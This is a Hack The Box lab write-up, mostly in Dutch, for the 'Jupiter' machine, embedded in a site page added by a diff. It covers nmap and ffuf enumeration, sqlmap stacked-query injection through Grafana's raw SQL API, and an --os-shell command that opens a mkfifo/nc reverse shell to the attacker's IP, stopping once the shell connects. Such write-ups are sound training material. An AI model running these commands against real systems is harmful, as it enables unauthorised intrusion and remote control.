@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Jupiter] └─$ nmap 10.129.229.15 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:26 CEST Nmap scan report for 10.129.229.15 Host is up (0.090s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-jupiter/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Jupiter] └─$ nmap 10.129.229.15 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:26 CEST Nmap scan report for 10.129.229.15 Host is up (0.090s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+  <meta itemprop="wordCount" content="1156">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Jupiter] └─$ nmap 10.129.229.15 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:26 CEST Nmap scan report for 10.129.229.15 Host is up (0.090s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-jupiter/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Jupiter]
+└─$ nmap 10.129.229.15 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:26 CEST
+Nmap scan report for 10.129.229.15
+Host is up (0.090s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Jupiter]
+└─$ nmap -p22,80 -sCV 10.129.229.15        
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:26 CEST
+Nmap scan report for 10.129.229.15
+Host is up (0.089s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
+|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://jupiter.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Ik ben de FQDN in de hosts file gaan zetten zodat ik naar de url kan gaan. Als je gaat kijken naar de URL dan kan je zien dat je daar helemaal niets kunt doen. Daarmee ben ik gaan kijken of dat er geen subdomain is. Dit kan je gaan kijken door gebruik te maken van FFUF.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Jupiter]
+└─$ ffuf -u http://jupiter.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &#34;Host:FUZZ.jupiter.htb&#34; -ac
+
+kiosk                   [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 174ms]
+</code></pre><p>Als je dit subdomain zult gaan toevoegen aan de hosts file, dan kan je zien dat als je de volgende url <code>kiosk.jupiter.htb</code> kan je zien dat je op een grafana pagina komt.</p>
+<p>![[Pasted image 20250725135051.png]]</p>
+<p>Als we in burpsuite gaan kijken kan je zien dat er een api query tab is. Dit wilt dus zeggen dat we eens gaan kijken of dat er geen interessante informatie in staat zoals een DB tabel, &hellip; . Zoals je hieronder kunt zien is de user <code>postgres</code> de database aan het runnen.</p>
+<p>![[Pasted image 20250725161438.png]]</p>
+<p>Je kan zien dat postgres de user is dat de database runned. Hieraan kan je zien dat je waarschijnlijk aan sql injection zult moeten doen. Ik ben dan naar artikels gaan opzoeken op pentesting postgressql en hierbij ben ik op het volgende artikel gekomen. <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html">https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html</a></p>
+<p>Voor dat je aan de sqlinjection begint zal je de informatie vanuit de <code>http://kiosk.jupiter.htb/api/ds/query</code> die je hebt gevonden door devtool te gebruiken in een file gaan zetten. Dit zal er als volgt uit komen te zien.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Jupiter]
+└─$ cat test                 
+POST /api/ds/query HTTP/1.1
+Host: kiosk.jupiter.htb
+Content-Length: 484
+x-dashboard-uid: jMgFGfA4z
+x-datasource-uid: YItSLg-Vz
+Accept-Language: en-US,en;q=0.9
+x-panel-id: 24
+x-plugin-id: postgres
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+accept: application/json, text/plain, */*
+content-type: application/json
+x-grafana-org-id: 1
+Origin: http://kiosk.jupiter.htb
+Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&amp;refresh=1d
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{&#34;queries&#34;:[{&#34;refId&#34;:&#34;A&#34;,&#34;datasource&#34;:{&#34;type&#34;:&#34;postgres&#34;,&#34;uid&#34;:&#34;YItSLg-Vz&#34;},&#34;rawSql&#34;:&#34;select \n  name as \&#34;Name\&#34;, \n  parent as \&#34;Parent Planet\&#34;, \n  meaning as \&#34;Name Meaning\&#34; \nfrom \n  moons \nwhere \n  parent = &#39;Saturn&#39; \norder by \n  name desc;&#34;,&#34;format&#34;:&#34;table&#34;,&#34;datasourceId&#34;:1,&#34;intervalMs&#34;:60000,&#34;maxDataPoints&#34;:460}],&#34;range&#34;:{&#34;from&#34;:&#34;2025-07-30T11:04:00.474Z&#34;,&#34;to&#34;:&#34;2025-07-30T17:04:00.474Z&#34;,&#34;raw&#34;:{&#34;from&#34;:&#34;now-6h&#34;,&#34;to&#34;:&#34;now&#34;}},&#34;from&#34;:&#34;1753873440474&#34;,&#34;to&#34;:&#34;1753895040474&#34;}
+</code></pre><p>Vanaf nu kan je sqlmap gaan gebruiken voor het injecte van de sql query. We zullen eerst gaan zien of een sqlinjection wel zal lukken door het volgende commando te gebruiken:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Jupiter]
+└─$ sqlmap -r test --fresh-queries --batch --dbms postgresql
+ 
+ &gt; 8.1 stacked queries (comment)&#39; injectable 
+ requests:
+---
+Parameter: JSON rawSql ((custom) POST)
+    Type: stacked queries
+    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
+    Payload: {&#34;queries&#34;:[{&#34;refId&#34;:&#34;A&#34;,&#34;datasource&#34;:{&#34;type&#34;:&#34;postgres&#34;,&#34;uid&#34;:&#34;YItSLg-Vz&#34;},&#34;rawSql&#34;:&#34;select \n  name as \&#34;Name\&#34;, \n  parent as \&#34;Parent Planet\&#34;, \n  meaning as \&#34;Name Meaning\&#34; \nfrom \n  moons \nwhere \n  parent = &#39;Saturn&#39; \norder by \n  name desc;;SELECT PG_SLEEP(5)--&#34;,&#34;format&#34;:&#34;table&#34;,&#34;datasourceId&#34;:1,&#34;intervalMs&#34;:60000,&#34;maxDataPoints&#34;:460}],&#34;range&#34;:{&#34;from&#34;:&#34;2025-07-30T11:04:00.474Z&#34;,&#34;to&#34;:&#34;2025-07-30T17:04:00.474Z&#34;,&#34;raw&#34;:{&#34;from&#34;:&#34;now-6h&#34;,&#34;to&#34;:&#34;now&#34;}},&#34;from&#34;:&#34;1753873440474&#34;,&#34;to&#34;:&#34;1753895040474&#34;}
+---
+
+[*] ending @ 20:15:16 /2025-07-30/
+</code></pre><p>Hierboven kan je zien dat de stacked queries injectable zijn. Door het help commando te gaan gebruiken van sqlmap ben ik de volgende code gaan</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Jupiter]
+└─$ sqlmap -r test --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables
+ 
+[*] starting @ 20:25:33 /2025-07-30/
+
+[20:25:33] [INFO] parsing HTTP request from &#39;test&#39;
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[20:25:33] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON rawSql ((custom) POST)
+    Type: stacked queries
+    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
+    Payload: {&#34;queries&#34;:[{&#34;refId&#34;:&#34;A&#34;,&#34;datasource&#34;:{&#34;type&#34;:&#34;postgres&#34;,&#34;uid&#34;:&#34;YItSLg-Vz&#34;},&#34;rawSql&#34;:&#34;select \n  name as \&#34;Name\&#34;, \n  parent as \&#34;Parent Planet\&#34;, \n  meaning as \&#34;Name Meaning\&#34; \nfrom \n  moons \nwhere \n  parent = &#39;Saturn&#39; \norder by \n  name desc;;SELECT PG_SLEEP(1)--&#34;,&#34;format&#34;:&#34;table&#34;,&#34;datasourceId&#34;:1,&#34;intervalMs&#34;:60000,&#34;maxDataPoints&#34;:460}],&#34;range&#34;:{&#34;from&#34;:&#34;2025-07-30T11:04:00.474Z&#34;,&#34;to&#34;:&#34;2025-07-30T17:04:00.474Z&#34;,&#34;raw&#34;:{&#34;from&#34;:&#34;now-6h&#34;,&#34;to&#34;:&#34;now&#34;}},&#34;from&#34;:&#34;1753873440474&#34;,&#34;to&#34;:&#34;1753895040474&#34;}
+---
+[20:25:34] [INFO] testing PostgreSQL
+[20:25:39] [INFO] confirming PostgreSQL
+[20:25:39] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[20:25:40] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: PostgreSQL
+[20:25:40] [INFO] fetching current user
+[20:25:40] [INFO] retrieved: grafana_viewer
+current user: &#39;grafana_viewer&#39;
+[20:26:38] [INFO] fetching current database
+[20:26:38] [INFO] retrieved: pu
+[20:26:53] [ERROR] invalid character detected. retrying..
+blic
+[20:27:06] [WARNING] on PostgreSQL you&#39;ll need to use schema names for enumeration as the counterpart to database names on other DBMSes
+current database (equivalent to schema on PostgreSQL): &#39;public&#39;
+[20:27:06] [WARNING] on PostgreSQL it is not possible to enumerate the hostname
+[20:27:06] [INFO] testing if current user is DBA
+current user is DBA: True
+[20:27:07] [INFO] fetching database users privileges
+[20:27:07] [INFO] fetching database users
+[20:27:07] [INFO] fetching number of database users
+[20:27:07] [INFO] retrieved: 2
+[20:27:10] [WARNING] reflective value(s) found and filtering out of statistical model, please wait                
+.............................. (done)
+
+[20:27:14] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#39;--no-cast&#39; or switch &#39;--hex&#39;
+[20:27:14] [INFO] retrieved: 
+[20:27:14] [ERROR] unable to retrieve the database users
+[20:27:14] [CRITICAL] unable to retrieve the privileges for the database users
+[20:27:14] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
+[20:27:14] [INFO] fetching database (schema) names
+[20:27:14] [INFO] fetching number of databases
+[20:27:14] [INFO] retrieved: 3
+[20:27:19] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+
+[20:27:23] [INFO] retrieved: 
+[20:27:24] [INFO] retrieved: 
+[20:27:24] [INFO] falling back to current database
+[20:27:24] [INFO] fetching current database
+available databases [1]:
+[*] public
+
+[20:27:24] [INFO] fetching tables for database: &#39;public&#39;
+[20:27:24] [INFO] fetching number of tables for database &#39;public&#39;
+[20:27:24] [INFO] retrieved: 1
+[20:27:26] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+moons
+Database: public
+[1 table]
++-------+
+| moons |
++-------+
+
+[20:27:52] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 75 times
+[20:27:52] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/kiosk.jupiter.htb&#39;
+
+[*] ending @ 20:27:52 /2025-07-30/
+</code></pre><p>RCE connection met de server</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Jupiter]
+└─$ sqlmap -r test --fresh-queries --batch --dbms postgresql --os-shell      
+
+os-shell&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.82 8001 &gt;/tmp/f &amp;
+do you want to retrieve the command standard output? [Y/n/a] Y
+[20:45:12] [INFO] retrieved: 
+No output
+os-shell&gt; 
+</code></pre><p>Listener</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 8001
+listening on [any] 8001 ...
+connect to [10.10.14.82] from (UNKNOWN) [10.129.229.15] 54226
+sh: 0: can&#39;t access tty; job control turned off
+$ ls
+</code></pre>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
